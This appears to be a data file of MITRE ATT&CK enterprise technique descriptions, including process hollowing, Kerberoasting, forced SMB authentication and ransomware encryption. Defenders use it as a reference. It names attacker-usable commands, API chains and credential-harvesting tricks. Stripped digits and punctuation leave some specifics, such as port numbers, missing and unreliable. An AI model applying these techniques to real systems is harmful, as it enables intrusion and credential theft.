attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6,['enterprise-attack'],['T1574'],Hijack Execution Flow,adversaries may execute their own malicious payloads by hijacking the way operating systems run programs  hijacking execution flow can be for the purposes of persistence  since this hijacked execution may reoccur over time  adversaries may also use these mechanisms to elevate privileges or evade defenses  such as application control or other restrictions on execution_  there are many ways an adversary may hijack the flow of execution  including by manipulating how the operating system locates programs to be executed  how the operating system locates libraries to be used by a program can also be intercepted  locations where the operating system looks for programs resources  such as file directories and in the case of windows the registry  could also be poisoned to include malicious payloads 
attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92,['enterprise-attack'],['T1027.005'],Indicator Removal from Tools,adversaries may remove indicators from tools if they believe their malicious tool was detected  quarantined  or otherwise curtailed  they can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems_  a good example of this is when malware is detected with a file signature and quarantined by anti virus software  an adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature  and then re use the malware 
attack-pattern--b0c74ef9-c61e-4986-88cb-78da98a355ec,['enterprise-attack'],['T1204.003'],Malicious Image,adversaries may rely on a user running a malicious image to facilitate execution  amazon web services  aws  amazon machine images  amis   google cloud platform  gcp  images  and azure images as well as popular container runtimes such as docker can be backdoored  backdoored images may be uploaded to a public repository via  upload  and users may then download and deploy an instance or container from the image without realizing the image is malicious  thus bypassing techniques that specifically achieve initial access  this can lead to the execution of malicious code  such as code that executes cryptocurrency mining  in the instance or container_ citation  summit route malicious amis   adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image  ex   match legitimate name or  aqua security cloud native threat report june      
attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81,['enterprise-attack'],['T1078'],Valid Accounts,adversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access  persistence  privilege escalation  or defense evasion  compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services  such as vpns  outlook web access  network devices  and remote desktop  compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network  adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence_  in some cases  adversaries may abuse inactive accounts  for example  those belonging to individuals who are no longer part of an organization  using these accounts may allow the adversary to evade detection  as the original account user will not be present to identify any anomalous activity taking place on their account_ citation  cisa mfa printnightmare   the overlap of permissions for local  domain  and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access  i_e_  domain or enterprise administrator  to bypass access controls set within the enterprise_ citation  technet credential theft 
attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18,['enterprise-attack'],['T1571'],Non-Standard Port,adversaries may communicate using a protocol and port paring that are typically not associated  for example  https over port      citation  symantec elfin mar       or port     citation  fortinet agent tesla april       as opposed to the traditional port      adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis parsing of network data 
attack-pattern--b1ccd744-3f78-4a0e-9bb2-2002057f7928,['enterprise-attack'],['T1585.001'],Social Media Accounts,adversaries may create and cultivate social media accounts that can be used during targeting  adversaries can create social media accounts that can be used to build a persona to further operations  persona development consists of the development of public information  presence  history and appropriate affiliations_  for operations incorporating social engineering  the utilization of a persona on social media may be important  these personas may be fictitious or impersonate real people  the persona may exist on a single social media site or across multiple sites  ex  facebook  linkedin  twitter  etc_   establishing a persona  on social media may require development of additional documentation to make them seem real  this could include filling out profile information  developing social networks  or incorporating photos    once a persona has been developed an adversary can use it to create connections to targets of interest  these connections may be direct or may include trying to connect through others  these accounts may be leveraged during other phases of the adversary lifecycle  such as during initial access  ex   spearphishing via
attack-pattern--b2001907-166b-4d71-bb3c-9d26c871de09,['enterprise-attack'],['T1073'],DLL Side-Loading,programs may specify dlls that are loaded at runtime  programs that improperly or vaguely specify a required dll may be open to a vulnerability in which an unintended dll is loaded  side loading vulnerabilities specifically occur when windows side by side  winsxs  manifests  citation  msdn manifests  are not explicit enough about characteristics of the dll to be loaded  adversaries may take advantage of a legitimate program that is vulnerable to side loading to load a malicious dll   citation  stewart        adversaries likely use this technique as a means of masking actions they perform under a legitimate  trusted system or software process 
attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4,['enterprise-attack'],['T1055.012'],Process Hollowing,adversaries may inject malicious code into suspended and hollowed processes in order to evade process based defenses  process hollowing is a method of executing arbitrary code in the address space of a separate live process     process hollowing is commonly performed by creating a process in a suspended state then unmapping hollowing its memory  which can then be replaced with malicious code  a victim process can be created with native windows api calls such as createprocess  which includes a flag to suspend the processes primary thread  at this point the process can be unmapped using apis calls such as zwunmapviewofsection or ntunmapviewofsection  before being written to  realigned to the injected code  and resumed via virtualallocex  writeprocessmemory  setthreadcontext  then resumethread respectively_ citation  leitch hollowing  citation  elastic process injection july        this is very similar to  thread local  but creates a new process rather than targeting an existing process  this behavior will likely not result in elevated privileges since the injected process was spawned from  and thus inherits the security context  of the injecting process  however  execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839,['enterprise-attack'],['T1068'],Exploitation for Privilege Escalation,adversaries may exploit software vulnerabilities in an attempt to elevate privileges  exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program  service  or within the operating system software or kernel itself to execute adversary controlled code  security constructs such as permission levels will often hinder access to information and use of certain techniques  so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions_  when initially gaining access to a system  an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system  vulnerabilities may exist  usually in operating system components and software commonly running at higher permissions  that can be exploited to gain higher levels of access on the system  this could enable someone to move from unprivileged or user level permissions to system or root permissions depending on the component that is vulnerable  this could also enable an adversary to move from a virtualized environment  such as within a virtual machine or container  onto the underlying host  this may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods_  adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode  this process is sometimes referred to as bring your own vulnerable driver  byovd _ citation  eset invisimole june       citation  unit   acidbox june       adversaries may include the vulnerable driver with files delivered during initial access or download it to a compromised system via  ingress tool  or  lateral tool
attack-pattern--b22e5153-ac28-4cc6-865c-2054e36285cb,['enterprise-attack'],['T1564.009'],Resource Forking,adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications  a resource fork provides applications a structured way to store resources such as thumbnail images  menu definitions  icons  dialog boxes  and code_ citation  macos hierarchical file system overview  usage of a resource fork is identifiable when displaying a file s extended attributes  using ls  l  or xattr  l commands  resource forks have been deprecated and replaced with the application bundle structure  non localized resources are placed at the top level directory of an application bundle  while localized resources are placed in the  resources folder_ citation  resource and data forks  citation  elc extended attributes   adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files  adversaries can execute content with an attached resource fork  at a specified offset  that is moved to an executable location then invoked  resource fork content may also be obfuscated encrypted until execution_ citation  sentinellabs resource named fork       citation  tau bundlore erika noerenberg      
attack-pattern--b24e2a20-3b3d-4bf0-823b-1ed765398fb0,['enterprise-attack'],['T1531'],Account Access Removal,adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users  accounts may be deleted  locked  or manipulated  ex  changed credentials  to remove access to accounts  adversaries may also subsequently log off and or perform a  system  to set malicious changes into place_ citation  carbonblack lockergoga       citation  unit   lockergoga        in windows   utility  set localuser and set adaccountpassword  cmdlets may be used by adversaries to modify user accounts  in linux  the passwd utility may be used to change passwords  accounts could also be disabled by group policy    adversaries who use ransomware may first perform this and other impact behaviors  such as  data  and  before completing the  data encrypted for  objective 
attack-pattern--b2d03cea-aec1-45ca-9744-9ee583c1e1cc,['enterprise-attack'],['T1110.004'],Credential Stuffing,adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap  occasionally  large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed  the information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts_  credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts  depending on the organization's login failure policies_  typically  management services over commonly used ports are used when stuffing credentials  commonly targeted services include the following     ssh     tcp    telnet     tcp    ftp     tcp    netbios   smb   samba      tcp       tcp    ldap      tcp    kerberos     tcp    rdp   terminal services       tcp    http http management services     tcp       tcp    mssql       tcp    oracle       tcp    mysql       tcp    vnc       tcp   in addition to management services  adversaries may  target single sign on  sso  and cloud based applications utilizing federated authentication protocols   as well as externally facing email applications  such as office    _ citation  us cert ta      a      
attack-pattern--b39d03cb-7b98-41c4-a878-c40c1a913dc0,['enterprise-attack'],['T1208'],Kerberoasting,service principal names  spns  are used to uniquely identify each instance of a windows service  to enable authentication  kerberos requires that spns be associated with at least one service logon account  an account specifically tasked with running a service  citation  microsoft detecting kerberoasting feb          citation  microsoft spn   citation  microsoft setspn   citation  sans attacking kerberos nov        citation  harmj y kerberoast nov        adversaries possessing a valid kerberos ticket granting ticket  tgt  may request one or more kerberos ticket granting service  tgs  service tickets for any spn from a domain controller  dc    citation  empire invokekerberoast oct        citation  adsecurity cracking kerberos dec       portions of these tickets may be encrypted with the rc  algorithm  meaning the kerberos   tgs rep etype    hash of the service account associated with the spn is used as the private key and is thus vulnerable to offline  brute  attacks that may expose plaintext credentials   citation  adsecurity cracking kerberos dec        citation  empire invokekerberoast oct        citation  harmj y kerberoast nov        this same attack could be executed using service tickets captured from network traffic   citation  adsecurity cracking kerberos dec        cracked hashes may enable persistence  privilege escalation  and  lateral movement via access to  valid   citation  sans attacking kerberos nov      
attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a,['enterprise-attack'],['T1027'],Obfuscated Files or Information,adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting  encoding  or otherwise obfuscating its contents on the system or in transit  this is common behavior that can be used across different platforms and the network to evade defenses    payloads may be compressed  archived  or encrypted in order to avoid detection  these payloads may be used during initial access or later to mitigate detection  sometimes a user's action may be required to open and  deobfuscate decode files or  for  user  the user may also be required to input a password to open a password protected compressed encrypted file that was provided by the adversary   citation  volexity powerduke november       adversaries may also use compressed or archived scripts  such as javascript    portions of files can also be encoded to hide the plain text strings that would otherwise help defenders with discovery   citation  linux cdorked_a we live security analysis  payloads may also be split into separate  seemingly benign files that only reveal malicious functionality when reassembled   citation  carbon black obfuscation sept        adversaries may also obfuscate commands executed from payloads or directly via a  command and scripting  environment variables  aliases  characters  and other platform language specific semantics can be used to evade signature based detections and application control mechanisms   citation  fireeye obfuscation june        citation  fireeye revoke obfuscation july       citation  paloalto encodedcommand march      
attack-pattern--b4409cd8-0da9-46e1-a401-a241afd4d1cc,['enterprise-attack'],['T1556.006'],Multi-Factor Authentication,adversaries may disable or modify multi factor authentication  mfa  mechanisms to enable persistent access to compromised accounts_  once adversaries have gained access to a network by either compromising an account lacking mfa or by employing an mfa bypass method such as  multi factor authentication request  adversaries may leverage their access to modify or completely disable mfa defenses  this can be accomplished by abusing legitimate features  such as excluding users from azure ad conditional access policies  registering a new yet vulnerable adversary controlled mfa method  or by manually patching mfa programs and configuration files to bypass expected functionality_ citation  mandiant apt    citation  azure ad conditional access exclusions   for example  modifying the windows hosts file   c  windows system   drivers etc hosts   to redirect mfa calls to localhost instead of an mfa server may cause the mfa process to fail  if a  fail open  policy is in place  any otherwise successful authentication attempt may be granted access without enforcing mfa   citation  russians exploit default mfa protocol   cisa march         depending on the scope  goals  and privileges of the adversary  mfa defenses may be disabled for individual accounts or for all accounts tied to a larger group  such as all domain accounts in a victim's network environment_ citation  russians exploit default mfa protocol   cisa march      
attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a,['enterprise-attack'],['T1114.002'],Remote Email Collection,adversaries may target an exchange server  office      or google workspace to collect sensitive information  adversaries may leverage a user's credentials and interact directly with the exchange server to acquire information from within a network  adversaries may also access externally facing exchange services  office      or google workspace to access email using credentials or access tokens  tools such as  can be used to automate searches for specific keywords 
attack-pattern--b46a801b-fd98-491c-a25a-bca25d6e3001,['enterprise-attack'],['T1505.004'],IIS Components,adversaries may install malicious components that run on internet information services  iis  web servers to establish persistence  iis provides several mechanisms to extend the functionality of the web servers  for example  internet server application programming interface  isapi  extensions and filters can be installed to examine and or modify incoming and outgoing iis web requests  extensions and filters are deployed as dll files that export three functions  get extension filter version  http extension filter proc  and  optionally  terminate extension filter   iis modules may also be installed to extend iis web servers_ citation  microsoft isapi extension overview       citation  microsoft isapi filter overview       citation  iis backdoor       citation  trustwave iis module        adversaries may install malicious isapi extensions and filters to observe and or modify traffic  execute commands on compromised machines  or proxy command and control traffic  isapi extensions and filters may have access to all iis web requests and responses  for example  an adversary may abuse these mechanisms to modify http responses in order to distribute malicious commands content to previously comprised hosts_ citation  microsoft isapi filter overview       citation  microsoft isapi extension overview       citation  microsoft isapi extension all incoming       citation  dell tg       citation  trustwave iis module       citation  mmpc isapi filter        adversaries may also install malicious iis modules to observe and or modify traffic  iis  _  introduced modules that provide the same unrestricted access to http requests and responses as isapi extensions and filters  iis modules can be written as a dll that exports registermodule  or as a _net application that interfaces with asp_net apis to access iis http requests_ citation  microsoft iis modules overview       citation  trustwave iis module       citation  eset iis malware      
attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52,['enterprise-attack'],['T1036.001'],Invalid Code Signature,adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user  analyst  or tool  code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with  adversaries can copy the metadata and signature information from a signed program  then use it as a template for an unsigned program  files with invalid code signatures will fail digital signature validation checks  but they may appear more legitimate to users and security tools may improperly handle these files_ citation  threatexpress metatwin        unlike  code  this activity will not result in a valid signature 
attack-pattern--b5327dd1-6bf9-4785-a199-25bcbd1f4a9d,['enterprise-attack'],['T1564.006'],Run Virtual Instance,adversaries may carry out malicious operations using a virtual instance to avoid detection  a wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment  by running malicious code inside of a virtual instance  adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance  additionally  depending on the virtual networking implementation  ex  bridged adapter   network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the ip address and hostname might not match known values_ citation  singhealth breach jan        adversaries may utilize native support for virtualization  ex  hyper v  or drop the necessary files to run a virtual instance  ex  virtualbox binaries   after running a virtual instance  adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system_ citation  sophos ragnar may      
attack-pattern--b53dbcc6-147d-48bb-9df4-bcb8bb808ff6,['enterprise-attack'],['T1154'],Trap,the trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals  a common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like ctrl c and ctrl d  adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism  trap commands are of the following format trap 'command list' signals where  command list  will be executed when  signals  are received_ citation  trap manual  citation  cyberciti trap statements 
attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5,['enterprise-attack'],['T1201'],Password Policy Discovery,adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment  password policies are a way to enforce complex passwords that are difficult to guess or crack through  brute  this information may help the adversary to create a list of common passwords and launch dictionary and or brute force attacks which adheres to the policy  e_g  if the minimum password length should be    then not trying passwords such as 'pass   '  not checking for more than     passwords per account if the lockout is set to   as to not lock out accounts _  password policies can be set and discovered on windows  linux  and macos systems via various command shell utilities such as net accounts   domain   get addefaultdomainpasswordpolicy  chage  l   cat  etc pam_d common password  and pwpolicy getaccountpolicies  citation  superuser linux password policies   citation  jamf user password policies   adversaries may also leverage a  network device  on network devices to discover password policy information  e_g  show aaa  show aaa common criteria policy all _  password policies can be discovered in cloud environments using available apis such as getaccountpasswordpolicy in aws  citation  aws getpasswordpolicy  
attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db,['enterprise-attack'],['T1546'],Event Triggered Execution,adversaries may establish persistence and or elevate privileges using system mechanisms that trigger execution based on specific events  various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications binaries  cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events_ citation  backdooring an aws account  citation  varonis power automate data exfiltration  citation  microsoft dart case report       adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code  after gaining access to a victim system  adversaries may create modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked_ citation  fireeye wmi       citation  malware persistence on os x  citation  amnesia malware   since the execution can be proxied by an account with higher permissions  such as system or service accounts  an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges 
attack-pattern--b63a34e8-0a61-4c97-a23b-bf8a2ed812e2,['enterprise-attack'],['T1546.004'],Unix Shell Configuration Modification,adversaries may establish persistence through executing malicious commands triggered by a user s shell  user  unix  execute several configuration scripts at different points throughout the session based on events  for example  when a user opens a command line interface or remotely logs in  such as via ssh  a login shell is initiated  the login shell executes scripts from the system   etc  and the user s home directory      to configure the environment  all login shells on a system use  etc profile when initiated  these configuration scripts run at the permission level of their directory and are often used to set environment variables  create aliases  and customize the user s environment  when the shell exits or terminates  additional shell scripts are executed to ensure the shell exits appropriately    adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells  using bash as an example  the default shell for most gnu linux systems  adversaries may add commands that launch malicious binaries into the  etc profile and  etc profile_d files_ citation  bencane blog bashrc  these files typically require root permissions to modify and are executed each time any shell on a system launches  for user level permissions  adversaries can insert malicious commands into   _bash_profile    _bash_login  or   _profile which are sourced when a user opens a command line interface or connects remotely_ citation  linux manual bash invocation  since the system only executes the first existing file in the listed order  adversaries have used   _bash_profile to ensure execution  adversaries have also leveraged the   _bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened  such as a new tab in the command line interface  some malware targets the termination of a program to trigger execution  adversaries can use the   _bash_logout file to execute malicious commands at the end of a session    for macos  the functionality of this technique is similar but may leverage zsh  the default shell for macos   _     when the terminal_app is opened  the application launches a zsh login shell and a zsh interactive shell  the login shell configures the system environment using  etc profile   etc zshenv   etc zprofile  and  etc zlogin_ citation  scriptingosx zsh  citation  macos ms office sandbox escape  the login shell then configures the user environment with   _zprofile and   _zlogin  the interactive shell uses the   _zshrc to configure the user environment  upon exiting   etc zlogout and   _zlogout are executed  for legacy programs  macos executes  etc bashrc on startup 
attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2,['enterprise-attack'],['T1187'],Forced Authentication,adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept_  the server message block  smb  protocol is commonly used in windows networks for authentication and communication between systems for access to resources and file sharing  when a windows system attempts to connect to an smb resource it will automatically attempt to authenticate and send credential information for the current user to the remote system   citation  wikipedia server message block  this behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources_  web distributed authoring and versioning  webdav  is also typically used by windows systems as a backup protocol when smb is blocked or fails  webdav is an extension of http and will typically operate over tcp ports    and       citation  didier stevens webdav traffic   citation  microsoft managing webdav security   adversaries may take advantage of this behavior to gain access to user account hashes through forced smb webdav authentication  an adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary  i_e   template  or place a specially crafted file on navigation path for privileged accounts  e_g  _scf file placed on desktop  or on a publicly accessible share to be accessed by victim s   when the user's system accesses the untrusted resource it will attempt authentication and send information  including the user's hashed credentials  over smb to the adversary controlled server   citation  github hashjacking  with access to the credential hash  an adversary can perform off line  brute  cracking to gain access to plaintext credentials   citation  cylance redirect to smb   there are several different ways this can occur   citation  osanda stealing netntlm hashes  some specifics from in the wild use include     a spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened  i_e   template  the document can include  for example  a request similar to file      remote address  normal_dotm to trigger the smb request   citation  us cert apt energy oct         a modified _lnk or _scf file with the icon filename pointing to an external reference such as    remote address  pic_png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials   citation  us cert apt energy oct      
attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023,['enterprise-attack'],['T1134.005'],SID-History Injection,adversaries may use sid history injection to escalate privileges and bypass access controls  the windows security identifier  sid  is a unique value that identifies a user or group account  sids are used by windows security in both security descriptors and access tokens   citation  microsoft sid  an account can hold additional sids in the sid history active directory attribute  citation  microsoft sid history attribute   allowing inter operable account migration between domains  e_g_  all values in sid history are included in access tokens _  with domain administrator  or equivalent  rights  harvested or well known sid values  citation  microsoft well known sids jun       may be inserted into sid history to enable impersonation of arbitrary users groups such as enterprise administrators  this manipulation may result in elevated access to local resources and or access to otherwise inaccessible domains via lateral movement techniques such as  remote   smb windows admin  or  windows remote
attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166,['enterprise-attack'],['T1599'],Network Boundary Bridging,adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation  breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks_  devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks   they achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections   restriction of traffic can be achieved by prohibiting ip addresses  layer   protocol ports  or through deep packet inspection to identify applications   to participate with the rest of the network  these devices can be directly addressable or transparent  but their mode of operation has no bearing on how the adversary can bypass them when compromised_  when an adversary takes control of such a boundary device  they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance   by achieving sufficient rights on the device  an adversary can reconfigure the device to allow the traffic they want  allowing them to then further achieve goals such as command and control via  multi hop  or exfiltration of data via  traffic  adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with  internal  to achieve the same goals_ citation  kaspersky threatneedle feb        in the cases where a border device separates two separate organizations  the adversary can also facilitate lateral movement into new victim environments 
attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0,['enterprise-attack'],['T1486'],Data Encrypted for Impact,adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources  they can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key  this may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key  ransomware  or to render data permanently inaccessible in cases where the key is not saved or transmitted_ citation  us cert ransomware       citation  fireeye wannacry       citation  us cert notpetya       citation  us cert samsam        in the case of ransomware  it is typical that common user files like office documents  pdfs  images  videos  audio  text  and source code files will be encrypted  and often renamed and or tagged with specific file markers   adversaries may need to first employ other behaviors  such as  file and directory permissions  or  system  in order to unlock and or gain access to manipulate these files_ citation  carbonblack conti july       in some cases  adversaries may encrypt critical system files  disk partitions  and the mbr_ citation  us cert notpetya         to maximize impact on the target organization  malware designed for encrypting data may have worm like features to propagate across a network by leveraging other attack techniques like  valid   os credential  and  smb windows admin  fireeye wannacry       citation  us cert notpetya       encryption malware may also leverage  internal  such as changing victim wallpapers  or otherwise intimidate victims by sending ransom notes or other messages to connected printers  known as  print bombing  _ citation  nhs digital egregor nov        in cloud environments  storage objects within compromised accounts may also be encrypted_ citation  rhino s  ransomware part   
attack-pattern--b82f7d37-b826-4ec9-9391-8e121c78aed7,['enterprise-attack'],['T1488'],Disk Content Wipe,adversaries may erase the contents of storage devices on specific systems as well as large numbers of systems in a network to interrupt availability to system and network resources_  adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface_ citation  novetta blockbuster  citation  novetta blockbuster destructive malware  citation  doj lazarus sony       instead of wiping specific disk structures or files  adversaries with destructive intent may wipe arbitrary portions of disk content  to wipe disk content  adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data_ citation  novetta blockbuster destructive malware  adversaries have been observed leveraging third party drivers like  to directly access disk content_ citation  novetta blockbuster  citation  novetta blockbuster destructive malware  this behavior is distinct from  data  because sections of the disk erased instead of individual files_  to maximize impact on the target organization in operations where network wide availability interruption is the goal  malware used for wiping disk content may have worm like features to propagate across a network by leveraging additional techniques like  valid   os credential  and  windows admin  novetta blockbuster destructive malware 
attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7,['enterprise-attack'],['T1553'],Subvert Trust Controls,adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs  operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust  examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate  a program prompting the user with a warning because it has an attribute set from being downloaded from the internet  or getting an indication that you are about to connect to an untrusted site_  adversaries may attempt to subvert these trust mechanisms  the method adversaries use will depend on the specific mechanism they seek to subvert  adversaries may conduct  file and directory permissions  or  modify  in support of subverting these controls_ citation  spectorops subverting trust sept       adversaries may also create or steal code signing certificates to acquire trust on target systems_ citation  securelist digital certificates  citation  symantec digital certificates 
attack-pattern--b84903f0-c7d5-435d-a69e-de47cc3578c0,['enterprise-attack'],['T1548.004'],Elevated Execution with Prompt,adversaries may leverage the authorizationexecutewithprivileges api to escalate privileges by prompting the user for credentials_ citation  appledocs authorizationexecutewithprivileges  the purpose of this api is to give application developers an easy way to perform operations with root privileges  such as for application installation or updating  this api does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified    although this api is deprecated  it still fully functions in the latest releases of macos  when calling this api  the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made  the program calling the api may also load world writable files which can be modified to perform malicious behavior with elevated privileges_  adversaries may abuse authorizationexecutewithprivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms_ citation  death by      installers  it's all broken   citation  carbon black shlayer feb       citation  osx coldroot rat  this technique may be combined with  to trick the user into granting escalated privileges to malicious code_ citation  death by      installers  it's all broken   citation  carbon black shlayer feb       this technique has also been shown to work by modifying legitimate programs present on the machine that make use of this api_ citation  death by      installers  it's all broken  
attack-pattern--b85f6ce5-81e8-4f36-aff2-3df9d02a9c9d,['enterprise-attack'],['T1592.003'],Firmware,adversaries may gather information about the victim's host firmware that can be used during targeting  information about host firmware may include a variety of details such as type and versions on specific hosts  which may be used to infer more information about hosts in the environment  ex  configuration  purpose  age patch level  etc_ _  adversaries may gather this information in various ways  such as direct elicitation via  phishing for  information about host firmware may only be exposed to adversaries via online or other accessible data sets  ex  job postings  network maps  assessment reports  resumes  or purchase invoices _ citation  arstechnica intel  gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open  or  search open technical  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   supply chain  or  exploit public facing
attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118,['enterprise-attack'],['T1573'],Encrypted Channel,adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol  despite the use of a secure algorithm  these implementations may be vulnerable to reverse engineering if secret keys are encoded and or generated within malware samples configuration files 
attack-pattern--b8c5c9dd-a662-479d-9428-ae745872537c,['enterprise-attack'],['T1174'],Password Filter DLL,windows password filters are password policy enforcement mechanisms for both domain and local accounts  filters are implemented as dynamic link libraries  dlls  containing a method to validate potential passwords against password policies  filter dlls can be positioned on local computers for local accounts and or domain controllers for domain accounts_  before registering new passwords in the security accounts manager  sam   the local security authority  lsa  requests validation from each registered filter  any potential changes cannot take effect until every registered filter acknowledges validation_  adversaries can register malicious password filters to harvest credentials from local computers and or entire domains  to perform proper validation  filters must receive plain text credentials from the lsa  a malicious password filter would receive these plain text credentials every time a password request is made   citation  carnal ownage password filters sept      
attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec,['enterprise-attack'],['T1547.002'],Authentication Package,adversaries may abuse authentication packages to execute dlls when the system boots  windows authentication package dlls are loaded by the local security authority  lsa  process at system start  they provide support for multiple logon processes and multiple security protocols to the operating system_ citation  msdn authentication packages   adversaries can use the autostart mechanism provided by lsa authentication packages for persistence by placing a reference to a binary in the windows registry location hklm system currentcontrolset control lsa  with the key value of  authentication packages   lt target binary gt   the binary will then be executed by the system when the authentication packages are loaded 
attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab,['enterprise-attack'],['T1218.010'],Regsvr32,adversaries may abuse regsvr  _exe to proxy execution of malicious code  regsvr  _exe is a command line program used to register and unregister object linking and embedding controls  including dynamic link libraries  dlls   on windows systems  the regsvr  _exe binary may also be signed by microsoft   citation  microsoft regsvr     malicious usage of regsvr  _exe may avoid triggering security tools that may not monitor execution of  and modules loaded by  the regsvr  _exe process because of allowlists or false positives from windows using regsvr  _exe for normal operations  regsvr  _exe can also be used to specifically bypass application control using functionality to load com scriptlets to execute dlls under user permissions  since regsvr  _exe is network and proxy aware  the scripts can be loaded by passing a uniform resource locator  url  to file on an external web server as an argument during invocation  this method makes no changes to the registry as the com object is not actually registered  only executed   citation  lolbas regsvr    this variation of the technique is often referred to as a  squiblydoo  and has been used in campaigns targeting governments   citation  carbon black squiblydoo apr        citation  fireeye regsvr   targeting mongolian gov   regsvr  _exe can also be leveraged to register a com object used to establish persistence via  component object model   citation  carbon black squiblydoo apr      
attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4,['enterprise-attack'],['T1002'],Data Compressed,an adversary may compress data  e_g_  sensitive documents  that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network  the compression is done separately from the exfiltration channel and is performed using a custom program or algorithm  or a more common compression library or utility such as  zip  rar  zip  or zlib 
attack-pattern--ba8e391f-14b5-496f-81f2-2d5ecd646c1c,['enterprise-attack'],['T1081'],Credentials in Files,adversaries may search local file systems and remote file shares for files containing passwords  these can be files created by users to store their own credentials  shared credential stores for a group of individuals  configuration files containing passwords for a system or service  or source code binary files containing embedded passwords_  it is possible to extract passwords from backups or saved virtual machines through  os credential   citation  cg       passwords may also be obtained from group policy preferences stored on the windows domain controller   citation  srd gpp   in cloud environments  authenticated user credentials are often stored in local configuration and credential files  in some cases  these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files   citation  specter ops   cloud credential storage 
